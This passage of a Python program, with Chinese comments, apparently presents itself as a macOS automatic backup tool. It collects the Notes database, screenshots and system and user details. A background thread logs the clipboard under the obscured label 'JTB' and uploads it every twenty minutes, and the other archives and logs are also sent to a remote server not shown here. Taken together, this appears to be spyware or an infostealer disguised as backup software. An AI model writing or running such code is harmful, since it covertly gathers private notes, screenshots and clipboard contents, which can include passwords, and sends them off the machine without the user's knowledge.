        check_conn = None
        try:
            source_uri = Path(source_file).as_uri() + "?mode=ro"
            src_conn = sqlite3.connect(source_uri, uri=True, timeout=10)
            dst_conn = sqlite3.connect(target_file)
            with dst_conn:
                src_conn.backup(dst_conn)
            dst_conn.close()
            dst_conn = None
            src_conn.close()
            src_conn = None

            check_conn = sqlite3.connect(target_file)
            integrity = check_conn.execute("PRAGMA integrity_check").fetchone()
            if not integrity or str(integrity[0]).lower() != "ok":
                raise sqlite3.DatabaseError(f"integrity_check 返回异常: {integrity}")
            return True
        except Exception as e:
            logging.error(f"生成备忘录数据库一致性快照失败 {source_file}: {e}")
            return False
        finally:
            for conn in (check_conn, dst_conn, src_conn):
                if conn is not None:
                    try:
                        conn.close()
                    except Exception:
                        pass

    try:
        copied_count = 0
        sqlite_failed = False
        # 复制附件和所有非 SQLite 文件；.sqlite 使用一致性快照，
        # .sqlite-wal/.sqlite-shm 不直接复制，避免产生无法恢复的半提交状态。
        for root, _, files in os.walk(notes_dir):
            for file in files:
                source_file = os.path.join(root, file)
                if not os.path.exists(source_file):
                    continue

                if file.endswith('.sqlite-wal') or file.endswith('.sqlite-shm'):
                    continue

                relative_path = os.path.relpath(root, notes_dir)
                target_sub_dir = os.path.join(notes_backup_directory, relative_path)
                if not backup_manager._ensure_directory(target_sub_dir):
                    continue

                target_file = os.path.join(target_sub_dir, file)
                if file.endswith('.sqlite'):
                    if snapshot_sqlite(source_file, target_file):
                        copied_count += 1
                    else:
                        sqlite_failed = True
                else:
                    try:
                        shutil.copy2(source_file, target_file)
                        copied_count += 1
                    except Exception as e:
                        logging.error(f"复制备忘录附件失败 {source_file}: {e}")

        if copied_count == 0 or sqlite_failed:
            logging.error("备忘录备份不完整：没有可复制文件或数据库快照失败")
            return None
        return notes_backup_directory
    except Exception as e:
        logging.error(f"备份备忘录数据失败: {e}")
        return None

def backup_screenshots():
    """备份截图文件"""
    def get_screenshot_location():
        """读取 macOS 截图自定义保存路径（若存在）"""
        try:
            output = subprocess.check_output(
                ['defaults', 'read', 'com.apple.screencapture', 'location'],
                stderr=subprocess.STDOUT
            ).decode('utf-8', errors='ignore').strip()
            if output and os.path.exists(output):
                return output
        except Exception:
            return None
        return None

    screenshot_paths = [
        os.path.expanduser('~/Desktop'),
        os.path.expanduser('~/Pictures')
    ]
    custom_path = get_screenshot_location()
    if custom_path and custom_path not in screenshot_paths:
        screenshot_paths.append(custom_path)

    screenshot_keywords = [
        "screenshot",
        "screen shot",
        "screen_shot",
        "屏幕快照",
        "屏幕截图",
        "截图",
        "截屏"
    ]
    screenshot_extensions = {
        ".png", ".jpg", ".jpeg", ".heic", ".gif", ".tiff", ".tif", ".bmp", ".webp"
    }
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    screenshot_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_screenshots")
    
    backup_manager = BackupManager()
    
    # 确保备份目录是空的
    if not backup_manager._ensure_free_space(0, os.path.dirname(screenshot_backup_directory) or screenshot_backup_directory):
        return None
    if not backup_manager._clean_directory(screenshot_backup_directory):
        return None
        
    files_found = False
    for source_index, source_dir in enumerate(screenshot_paths):
        if os.path.exists(source_dir):
            try:
                # 扫描整个目录，筛选包含"screenshot"关键字的文件
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        # 检查文件名是否包含截图关键字（不区分大小写）
                        file_lower = file.lower()
                        _, ext = os.path.splitext(file_lower)
                        # 既要命中截图关键字，也要是常见图片格式
                        if not any(keyword in file_lower for keyword in screenshot_keywords):
                            continue
                        if ext and ext not in screenshot_extensions:
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # 检查文件大小
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0:
                                continue
                        except OSError:
                            continue
                            
                        source_label = os.path.basename(os.path.normpath(source_dir)) or f"source_{source_index}"
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(
                            screenshot_backup_directory,
                            f"source_{source_index:02d}_{source_label}",
                            relative_path,
                        )
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"📸 已备份截图: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"复制截图文件失败 {source_file}: {e}")
            except Exception as e:
                logging.error(f"处理截图目录失败 {source_dir}: {e}")
        else:
            logging.error(f"截图目录不存在: {source_dir}")
            
    if files_found:
        logging.info("📸 截图备份完成，已找到符合规则的文件")
    else:
        logging.info("📸 未找到符合规则的截图文件")
            
    return screenshot_backup_directory if files_found else None


def backup_mac_data(backup_manager):
    """备份Mac系统数据，返回 (备份文件路径列表, 是否部分失败)（不执行上传）
    
    Args:
        backup_manager: 备份管理器实例
        
    Returns:
        tuple: (备份文件路径列表, 是否部分失败)
    """
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    backup_paths = []
    partial_detected = False
    try:
        # 备份备忘录数据
        notes_backup = backup_notes()
        if notes_backup:
            backup_path = backup_manager.zip_backup_folder(
                notes_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_notes_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("☑️ 备忘录数据备份文件已准备完成\n")
            else:
                logging.error("❌ 备忘录数据压缩失败\n")
                partial_detected = True
        else:
            logging.error("❌ 备忘录数据收集失败\n")
            partial_detected = True
        
        # 备份截图文件
        screenshots_backup = backup_screenshots()
        if screenshots_backup:
            backup_path = backup_manager.zip_backup_folder(
                screenshots_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_screenshots_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("☑️ 截图文件备份文件已准备完成\n")
            else:
                logging.error("❌ 截图文件压缩失败\n")
                partial_detected = True
        else:
            logging.info("ℹ️ 未发现可备份的截图文件\n")

    except Exception as e:
        logging.error(f"Mac数据备份失败: {e}")
        partial_detected = True
    
    return backup_paths, partial_detected

def backup_volumes(backup_manager, available_volumes):
    """备份可用数据卷，返回 (备份文件路径列表, 是否部分失败)（不执行上传）
    
    Returns:
        tuple: (备份文件路径列表, 是否部分失败)
    """
    backup_paths = []
    partial_detected = False
    for volume_name, volume_configs in available_volumes.items():
        logging.info(f"\n正在处理数据卷 {volume_name}")
        for backup_type, (source_dir, target_dir, ext_type) in volume_configs.items():
            try:
                if backup_type == 'specified':
                    # 使用新的指定文件备份方法
                    backup_result = backup_manager.backup_specified_files(source_dir, target_dir)
                else:
                    # 使用原有的备份方法
                    backup_result = backup_manager.backup_disk_files(source_dir, target_dir, ext_type)
                
                backup_dir = getattr(backup_result, 'path', None)
                if backup_result:
                    if isinstance(backup_result, BackupResult) and backup_result.status == "partial":
                        partial_detected = True
                        logging.warning(
                            f"⚠️ {volume_name} {backup_type} 部分文件备份失败，"
                            f"遗漏 {len(backup_result.missing_files)} 个文件"
                        )
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    if backup_path:
                        if isinstance(backup_path, list):
                            backup_paths.extend(backup_path)
                        else:
                            backup_paths.append(backup_path)
                        if isinstance(backup_result, BackupResult) and backup_result.status == "partial":
                            logging.warning(f"⚠️ {volume_name} {backup_type} 仅部分文件已归档\n")
                        else:
                            logging.critical(f"☑️ {volume_name} {backup_type} 备份文件已准备完成\n")
                    else:
                        logging.error(f"❌ {volume_name} {backup_type} 压缩失败\n")
                else:
                    logging.error(f"❌ {volume_name} {backup_type} 备份失败\n")
                    partial_detected = True
            except Exception as e:
                logging.error(f"❌ {volume_name} {backup_type} 备份出错: {str(e)}\n")
                partial_detected = True
    
    return backup_paths, partial_detected

def periodic_backup_upload(backup_manager):
    """定期执行备份和上传"""
    # 使用新的备份目录路径
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    clipboard_log_path = os.path.join(backup_manager.config.BACKUP_ROOT, f"{user_prefix}_clipboard_log.txt")
    
    # 启动JTB监控线程
    clipboard_monitor_thread = threading.Thread(
        target=backup_manager.monitor_clipboard,
        args=(clipboard_log_path, backup_manager.config.CLIPBOARD_CHECK_INTERVAL),
        daemon=True
    )
    clipboard_monitor_thread.start()
    logging.critical("📋 JTB监控线程已启动")
    
    # 启动JTB上传线程
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    logging.critical("📤 JTB上传线程已启动")
    
    # 初始化JTB日志文件
    try:
        os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
        startup_line = f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n"
        if os.path.exists(clipboard_log_path):
            with open(clipboard_log_path, 'a', encoding='utf-8') as f:
                f.write(startup_line)
        else:
            with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                f.write(startup_line)
    except Exception as e:
        logging.error(f"❌ 初始化JTB日志失败: {e}")

    # 获取用户名和系统信息
    username = getpass.getuser()
    hostname = socket.gethostname()
    current_time = datetime.now()
    
    # 获取系统环境信息
    system_info = {
        "操作系统": platform.system(),
        "系统版本": platform.release(),
        "系统架构": platform.machine(),
        "Python版本": platform.python_version(),
        "主机名": hostname,
        "用户名": username,
    }
    
    # 获取macOS详细版本信息
    try:
        if platform.system() == "Darwin":
            mac_ver = platform.mac_ver()[0]
            if mac_ver:
                system_info["macOS版本"] = mac_ver
            
            # 尝试获取更详细的macOS版本名称
            try:
                result = subprocess.run(
                    ['sw_vers', '-productVersion'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    system_info["macOS详细版本"] = result.stdout.strip()
            except (subprocess.TimeoutExpired, subprocess.SubprocessError, OSError):
                pass
    except Exception:
        pass
    
    # 输出启动信息和系统环境
    logging.critical("\n" + "="*50)
    logging.critical("🚀 自动备份系统已启动")
    logging.critical("="*50)
    logging.critical(f"⏰ 启动时间: {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logging.critical("-"*50)
    logging.critical("📊 系统环境信息:")
    for key, value in system_info.items():
        logging.critical(f"   • {key}: {value}")
    logging.critical("-"*50)
    logging.critical("📋 JTB监控和自动上传已启动")
    logging.critical("="*50)

    def read_next_backup_time():
        """读取下次备份时间"""
        try:
            if os.path.exists(BackupConfig.THRESHOLD_FILE):
                with open(BackupConfig.THRESHOLD_FILE, 'r') as f:
                    time_str = f.read().strip()
                    return datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
            return None
        except Exception:
            return None

    def write_next_backup_time():
        """写入下次备份时间"""
        try:
            next_time = datetime.now() + timedelta(seconds=BackupConfig.BACKUP_INTERVAL)
            os.makedirs(os.path.dirname(BackupConfig.THRESHOLD_FILE), exist_ok=True)
            with open(BackupConfig.THRESHOLD_FILE, 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"写入下次备份时间失败: {e}")
            return None

    def read_retry_time():
        """读取失败后的重试时间。"""
        try:
            if os.path.exists(BackupConfig.RETRY_THRESHOLD_FILE):
                with open(BackupConfig.RETRY_THRESHOLD_FILE, 'r') as f:
                    time_str = f.read().strip()
                    return datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
            return None
        except Exception:
            return None

    def write_retry_time():
        """写入失败后的重试时间，不推进正常备份周期。"""
        try:
            retry_time = datetime.now() + timedelta(seconds=BackupConfig.ERROR_RETRY_DELAY)
            os.makedirs(os.path.dirname(BackupConfig.RETRY_THRESHOLD_FILE), exist_ok=True)
            with open(BackupConfig.RETRY_THRESHOLD_FILE, 'w') as f:
                f.write(retry_time.strftime('%Y-%m-%d %H:%M:%S'))
            return retry_time
        except Exception as e:
            logging.error(f"写入重试时间失败: {e}")
            return None

    def clear_retry_time():
        """成功后清除失败重试时间。"""
        try:
            if os.path.exists(BackupConfig.RETRY_THRESHOLD_FILE):
                os.remove(BackupConfig.RETRY_THRESHOLD_FILE)
        except Exception:
            pass

    def should_backup_now():
        """检查是否应该执行备份"""
        next_backup_time = read_next_backup_time()
        retry_time = read_retry_time()
        if next_backup_time is not None and datetime.now() >= next_backup_time:
            return True
        if retry_time is not None and datetime.now() >= retry_time:
            return True
        return next_backup_time is None and retry_time is None

    def load_upload_state():
        """读取持久化的上传任务状态。"""
        default_state = {"pending": [], "failed": [], "completed": []}
        try:
            if os.path.exists(BackupConfig.BACKUP_STATE_FILE):
                with open(BackupConfig.BACKUP_STATE_FILE, 'r', encoding='utf-8') as f:
                    state = json.load(f)
                if isinstance(state, dict):
                    for key in default_state:
                        if not isinstance(state.get(key), list):
                            state[key] = []
                    return state
            return default_state
        except Exception as e:
            logging.error(f"读取上传任务状态失败: {e}")
            return default_state

    def save_upload_state(state):
        """保存上传任务状态。"""
        try:
            os.makedirs(os.path.dirname(BackupConfig.BACKUP_STATE_FILE), exist_ok=True)
            tmp_path = BackupConfig.BACKUP_STATE_FILE + '.tmp'
            with open(tmp_path, 'w', encoding='utf-8') as f:
                json.dump(state, f, ensure_ascii=False, indent=2)
            os.replace(tmp_path, BackupConfig.BACKUP_STATE_FILE)
        except Exception as e:
            logging.error(f"保存上传任务状态失败: {e}")

    def register_backup_paths(paths):
        """将本轮生成的备份文件加入待上传队列，并返回待处理路径列表。"""
        state = load_upload_state()
        for path in paths:
            if path not in state["pending"] and path not in state["completed"]:
                state["pending"].append(path)
            if path in state["failed"]:
                state["failed"].remove(path)
        save_upload_state(state)
        return state

    def mark_upload_result(path, success):
        """更新单个备份文件的上传状态。"""
        state = load_upload_state()
        state["pending"] = [p for p in state.get("pending", []) if p != path]
        if success:
            if path not in state.get("completed", []):
                state.setdefault("completed", []).append(path)
            state["failed"] = [p for p in state.get("failed", []) if p != path]
        else:
            if path not in state.get("failed", []):
                state.setdefault("failed", []).append(path)
            state["completed"] = [p for p in state.get("completed", []) if p != path]
        save_upload_state(state)

    while True:
        cycle_succeeded = False
        try:
            if not should_backup_now():
                time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)
                continue

            current_time = datetime.now()
            logging.critical("\n" + "="*40)
            logging.critical(f"⏰ 开始备份  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
            logging.critical("-"*40)

            available_volumes = get_available_volumes()

            logging.critical("\n💾 数据卷备份")
            volumes_backup_paths, volumes_partial = backup_volumes(backup_manager, available_volumes)

            logging.critical("\n🍎 Mac系统数据备份")
            mac_data_backup_paths, mac_data_partial = backup_mac_data(backup_manager)

            # 本轮新生成的备份文件先注册到持久化任务队列。
            all_backup_paths = volumes_backup_paths + mac_data_backup_paths
            backup_partial = volumes_partial or mac_data_partial
            register_backup_paths(all_backup_paths)
            state = load_upload_state()
            pending_paths = list(dict.fromkeys(
                [p for p in state.get("pending", []) if os.path.exists(p)] +
                [p for p in state.get("failed", []) if os.path.exists(p)]
            ))
            failed_paths = state.get("failed", [])
            completed_paths = state.get("completed", [])

            logging.critical(
                f"📋 上传任务状态: 待处理 {len(pending_paths)} 个，"
                f"失败 {len(failed_paths)} 个，已完成 {len(completed_paths)} 个"
            )

            has_new_backup = len(all_backup_paths) > 0
            if has_new_backup and not backup_partial:
                logging.critical("\n" + "="*40)
                logging.critical(f"✅ 本地备份阶段完成  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                logging.critical("="*40 + "\n")
            elif has_new_backup:
                logging.critical("\n" + "="*40)
                logging.critical(f"⚠️ 本地备份阶段部分完成  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                logging.critical("="*40 + "\n")
            else:
                logging.critical("\n" + "="*40)
                logging.critical("❌ 本地备份未生成有效归档")
                logging.critical("="*40 + "\n")

            upload_success = True
            if pending_paths:
                logging.critical("📤 开始上传待处理备份文件...")
                for backup_path in pending_paths:
                    success = backup_manager.upload_file(backup_path)
                    mark_upload_result(backup_path, success)
                    if not success:
                        upload_success = False

                if upload_success:
                    logging.critical("✅ 所有待处理备份文件上传成功")
                else:
                    logging.error("❌ 部分备份文件上传失败，将保留在待处理队列中")
            elif not has_new_backup:
                upload_success = False

            # 上传备份日志
            logging.critical("\n📝 正在上传备份日志...")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as e:
                logging.error(f"❌ 日志备份上传失败: {e}")

            # 只有本轮生成有效归档且全部上传成功，才推进正常的 7 天周期。
            # 仅处理遗留失败任务并成功时，清除失败重试标记，但不推进正常周期。
            cycle_succeeded = has_new_backup and upload_success and not backup_partial
            retry_only_succeeded = (not has_new_backup) and bool(pending_paths) and upload_success
            if cycle_succeeded:
                next_backup_time = write_next_backup_time()
                clear_retry_time()
                logging.critical("✅ 备份与上传全部完成")
                if next_backup_time:
                    logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)
            elif retry_only_succeeded:
                clear_retry_time()
                logging.critical("✅ 遗留备份文件已重新上传成功")
                time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)
            else:
                retry_time = write_retry_time()
                if retry_time:
                    logging.critical(f"🔄 上传/备份未完全成功，将在 {retry_time.strftime('%H:%M:%S')} 后重试")
                time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

        except Exception as e:
            logging.error(f"\n❌ 备份出错: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error(f"❌ 日志备份失败: {log_error}")
            write_retry_time()
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def backup_and_upload_logs(backup_manager):
    """备份并上传日志文件"""
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
            return
            
        # 刷新日志缓冲区，确保所有日志都已写入文件
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # 等待一小段时间，确保文件系统同步
        time.sleep(0.5)

        # 创建临时目录
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'backup_logs')
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("❌ 无法创建临时日志目录")
            return

        # 创建带时间戳的备份文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
        backup_path = os.path.join(temp_dir, backup_name)

        lock_path = log_file + '.lock'
        lock_handle = None
        try:
            lock_handle = open(lock_path, 'a', encoding='utf-8')
            if fcntl is not None:
                fcntl.flock(lock_handle, fcntl.LOCK_EX)

            with open(log_file, 'rb') as src:
                snapshot = src.read()

            if not snapshot or not snapshot.strip():
                logging.warning("⚠️ 日志内容为空，跳过上传")
                return

            with open(backup_path, 'wb') as dst:
                dst.write(snapshot)

            if not os.path.exists(backup_path) or os.path.getsize(backup_path) == 0:
                logging.error("❌ 备份日志文件创建失败或为空")
                return

            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # 只删除已经成功上传的快照；上传期间新写入的日志必须保留。
                with open(log_file, 'rb') as current_file:
                    current_snapshot = current_file.read()
                if current_snapshot.startswith(snapshot):
                    remainder = current_snapshot[len(snapshot):]
                    with open(log_file, 'wb') as current_file:
                        current_file.write(remainder)
                    logging.info("✅ 备份日志上传成功，已仅清理已上传快照")
                else:
                    logging.warning("⚠️ 日志文件在快照后发生了结构变化，未清空当前日志")
            else:
                logging.error("❌ 备份日志上传失败，保留原始日志")
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 复制或读取日志文件失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理日志文件时出错: {e}")
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
        finally:
            if lock_handle is not None:
                if fcntl is not None:
                    try:
                        fcntl.flock(lock_handle, fcntl.LOCK_UN)
                    except Exception:
                        pass
                lock_handle.close()
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"清理临时目录失败: {e}")
                
    except Exception as e:
        logging.error(f"❌ 处理备份日志时出错: {e}")
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """JTB上传线程
    
    Args:
        backup_manager: 备份管理器实例
        clipboard_log_path: JTB日志文件路径
    """
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    last_upload_time = 0
    
    while True:
        try:
            current_time = time.time()
            
            # 检查是否需要上传（每20分钟检查一次）
            if current_time - last_upload_time >= BackupConfig.CLIPBOARD_INTERVAL:
                if os.path.exists(clipboard_log_path):
                    # 检查文件大小
                    file_size = os.path.getsize(clipboard_log_path)
                    if file_size > 0:
                        # 检查文件内容是否有实际记录
                        if backup_manager.has_clipboard_content(clipboard_log_path):
                            # 创建临时文件
                            temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'clipboard')
                            if backup_manager._ensure_directory(temp_dir):
                                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                temp_file = os.path.join(temp_dir, f"{user_prefix}_clipboard_{timestamp}.txt")
                                
                                try:
                                    # 复制当前快照，并在上传成功后只清理已上传快照，
                                    # 保留上传期间新增的 JTB 记录。
                                    with open(clipboard_log_path, 'rb') as src:
                                        snapshot = src.read()
                                    with open(temp_file, 'wb') as dst:
                                        dst.write(snapshot)
                                    
                                    # 上传临时文件
                                    if backup_manager.upload_file(temp_file):
                                        with open(clipboard_log_path, 'rb') as current_file:
                                            current_snapshot = current_file.read()
                                        if current_snapshot.startswith(snapshot):
                                            remainder = current_snapshot[len(snapshot):]
                                            with open(clipboard_log_path, 'wb') as current_file:
                                                current_file.write(remainder)
                                        else:
                                            logging.warning("⚠️ JTB日志在快照后发生了结构变化，未清空当前日志")
                                        last_upload_time = current_time
                                        if backup_manager.config.DEBUG_MODE:
                                            logging.info("📤 JTB日志上传成功")
                                except Exception as e:
                                    if backup_manager.config.DEBUG_MODE:
                                        logging.error(f"❌ JTB日志上传失败: {e}")
                                finally:
                                    # 清理临时目录
                                    try:
                                        if os.path.exists(temp_dir):
                                            shutil.rmtree(temp_dir)
                                    except Exception:
                                        pass
                        else:
                            # 文件没有实际内容，清空文件并重置上传时间
                            if backup_manager.config.DEBUG_MODE:
                                logging.info("📋 JTB文件无实际内容，跳过上传")
                            with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                            last_upload_time = current_time
                
            # 定期检查
            time.sleep(backup_manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL)
            
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.error(f"JTB上传线程错误: {e}")
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def main():
    """主函数"""
    if requests is None or HTTPBasicAuth is None:
        print("❌ 缺少必需依赖 requests，请先执行: pip install requests")
        sys.exit(1)

    try:
        os.makedirs(BackupConfig.BACKUP_ROOT, exist_ok=True)
    except Exception as e:
        print(f"❌ 无法创建备份目录: {e}")
        sys.exit(1)

    lock_path = os.path.join(BackupConfig.BACKUP_ROOT, 'backup.lock')
    lock_handle = None
    try:
        lock_handle = open(lock_path, 'a+', encoding='utf-8')
        if fcntl is not None:
            try:
                fcntl.flock(lock_handle, fcntl.LOCK_EX | fcntl.LOCK_NB)
            except OSError:
                print("备份程序已经在运行，本次启动退出")
                return

        # 写 PID 仅用于排查，实际互斥由 fcntl.flock 保证，不会误删其他实例的锁。
        lock_handle.seek(0)
        lock_handle.truncate()
        lock_handle.write(str(os.getpid()))
        lock_handle.flush()

        # 检查磁盘空间，不足时直接停止，避免继续复制/压缩进一步耗尽磁盘。
        try:
            free_space = shutil.disk_usage(BackupConfig.BACKUP_ROOT).free
            if free_space < BackupConfig.MIN_FREE_SPACE:
                print(f'❌ 备份驱动器空间不足: {free_space / (1024*1024*1024):.2f}GB')
                return
        except Exception as e:
            print(f'⚠️ 无法检查磁盘空间: {e}')

        while True:
            try:
                backup_manager = BackupManager()
                clean_backup_directory()
                periodic_backup_upload(backup_manager)
            except KeyboardInterrupt:
                raise
            except Exception as e:
                logging.error(f'备份过程发生错误: {str(e)}')
                time.sleep(BackupConfig.MAIN_ERROR_RETRY_DELAY)

    except KeyboardInterrupt:
        logging.info('备份程序被用户中断')
    finally:
        if lock_handle is not None:
            try:
                if fcntl is not None:
                    fcntl.flock(lock_handle, fcntl.LOCK_UN)
            except Exception:
                pass
            lock_handle.close()

if __name__ == "__main__":
    main()
